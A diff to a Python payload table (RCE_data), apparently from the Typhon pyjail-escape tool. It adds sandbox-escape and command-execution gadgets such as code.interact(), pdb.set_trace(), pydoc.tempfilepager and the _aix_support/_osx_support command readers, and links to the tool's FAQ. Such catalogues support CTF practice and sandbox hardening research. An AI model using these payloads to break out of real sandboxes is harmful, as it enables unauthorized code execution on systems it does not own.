@@ -13,6 +13,23 @@ RCE_data = {
             "breakpoint",
             "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#breakpoint-rce",
         ],
+        [
+            "code.interact()",
+            "code",
+        ],
+        [
+            "code.InteractiveConsole().interact()",
+            "code",
+        ],
+        [
+            "doctest.debug_script(RANDOMSTRING)",
+            "doctest",
+        ],
+        [
+            "pdb.run(RANDOMSTRING)",
+            "pdb",
+        ],
+        ["pdb.set_trace()", "pdb"],
         ["exec(input())", "exec,input"],
         ["eval(input())", "eval,input"],
         ["compile(input(),RANDOMSTRING,'exec')", "compile,input"],
@@ -30,7 +47,6 @@ RCE_data = {
             "from uuid import _get_command_stdout as __getattr__;from __main__ import sh",
             "BUILTINS_SET_CHANGED|BUILTINS_SET",
         ],
-        ["import pdb;pdb.set_trace()", "BUILTINS_SET_CHANGED|BUILTINS_SET"],
     ],
     "builtins2RCEinput": [
         [
@@ -224,7 +240,8 @@ RCE_data = {
         ["os.system(COMMAND)", "os"],
         ["os.popen(COMMAND).read()", "os"],
         ["pty.spawn(COMMAND)", "pty"],
-        ["pydoc.pipepager(COMMAND,COMMAND)", "pydoc"],
+        ["pydoc.pipepager(RANDOMSTRING,COMMAND)", "pydoc"],
+        ["pydoc.tempfilepager(RANDOMSTRING,COMMAND)", "pydoc"],
         ["subprocess.check_call(COMMAND)", "subprocess"],
         ["subprocess.call(COMMAND,shell=TRUE)", "subprocess"],
         ["subprocess.Popen(COMMAND,shell=TRUE)", "subprocess"],
@@ -243,6 +260,16 @@ RCE_data = {
         [
             "multiprocessing.util.spawnv_passfds(bCMD_FILE,[bCMD_FILE,UNFOLD_CMD_ARGS],[])",
             "multiprocessing",
+        ],
+        [
+            "_aix_support._read_cmd_output(COMMAND)",
+            "_aix_support",
+            "Only works on limited platforms.",
+        ],
+        [
+            "_osx_support._read_output(COMMAND)",
+            "_aix_support",
+            "Only works on limited platforms.",
         ],
     ],
     "exec": [
